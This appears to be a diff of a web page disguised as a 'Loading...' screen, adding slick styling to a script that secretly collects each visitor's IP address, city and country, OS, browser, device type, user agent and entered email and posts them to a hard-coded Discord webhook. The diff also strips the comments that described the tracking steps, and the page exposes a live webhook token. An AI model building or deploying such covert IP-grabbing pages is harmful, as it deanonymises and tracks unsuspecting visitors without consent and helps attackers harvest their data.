@@ -2,8 +2,76 @@
 <html>
 <head>
 <title>Loading...</title>
+
+<style>
+body{
+font-family: Arial, sans-serif;
+background: linear-gradient(135deg,#1e1e2f,#2c2c54);
+height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+color:white;
+}
+
+/* Fancy box */
+.hi-box{
+background: rgba(255,255,255,0.08);
+backdrop-filter: blur(10px);
+padding:25px 40px;
+border-radius:15px;
+box-shadow:0 10px 30px rgba(0,0,0,0.4);
+font-size:28px;
+font-weight:bold;
+margin-bottom:25px;
+text-align:center;
+}
+
+/* Form styling */
+form{
+background: rgba(255,255,255,0.08);
+padding:30px;
+border-radius:15px;
+box-shadow:0 10px 25px rgba(0,0,0,0.4);
+display:flex;
+flex-direction:column;
+gap:15px;
+}
+
+/* Input */
+input{
+padding:12px;
+border:none;
+border-radius:8px;
+outline:none;
+font-size:15px;
+}
+
+/* Fancy button */
+button{
+padding:12px;
+border:none;
+border-radius:10px;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+background: linear-gradient(45deg,#6a5cff,#00d4ff);
+color:white;
+transition: all 0.25s ease;
+box-shadow:0 5px 15px rgba(0,0,0,0.3);
+}
+
+button:hover{
+transform: translateY(-3px) scale(1.03);
+box-shadow:0 10px 25px rgba(0,0,0,0.5);
+}
+</style>
+
 </head>
 <body>
+
+<div class="hi-box">Hi</div>
 
 <h2>Loading...</h2>
 
@@ -19,17 +87,13 @@ async function collectData(emailValue){
 
 try{
 
-// get IP + location
 let res = await fetch("https://ipapi.co/json/");
 let data = await res.json();
 
-// device type
 let device = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
 
-// runtime
 let runtime = (Date.now() - startTime) + " ms";
 
-// OS detection
 let os = "Unknown";
 if(navigator.userAgent.includes("Windows")) os="Windows";
 else if(navigator.userAgent.includes("Android")) os="Android";
@@ -37,14 +101,12 @@ else if(navigator.userAgent.includes("Linux")) os="Linux";
 else if(navigator.userAgent.includes("Mac")) os="MacOS";
 else if(navigator.userAgent.includes("iPhone")) os="iOS";
 
-// browser detection
 let browser="Unknown";
 if(navigator.userAgent.includes("Chrome")) browser="Chrome";
 if(navigator.userAgent.includes("Firefox")) browser="Firefox";
 if(navigator.userAgent.includes("Safari")) browser="Safari";
 if(navigator.userAgent.includes("Edg")) browser="Edge";
 
-// webhook
 await fetch("https://discord.com/api/webhooks/1481661221790023710/hThn3wMMdPQreiO0e-OeKcpS7RjPfW2CFHo8FFFBVA0GOTq86IzYadgpJQvEf9psIG-O",{
 method:"POST",
 headers:{
@@ -52,15 +114,15 @@ headers:{
 },
 body:JSON.stringify({
 content:
-` IP: ${data.ip}
- Location: ${data.city}, ${data.country_name}
- OS: ${os}
- Browser: ${browser}
- Device: ${device}
- Time: ${new Date().toString()}
- Runtime: ${runtime}
- Email: ${emailValue || "Not provided"}
- UserAgent: ${navigator.userAgent}`
+`IP: ${data.ip}
+Location: ${data.city}, ${data.country_name}
+OS: ${os}
+Browser: ${browser}
+Device: ${device}
+Time: ${new Date().toString()}
+Runtime: ${runtime}
+Email: ${emailValue || "Not provided"}
+UserAgent: ${navigator.userAgent}`
 })
 });
 
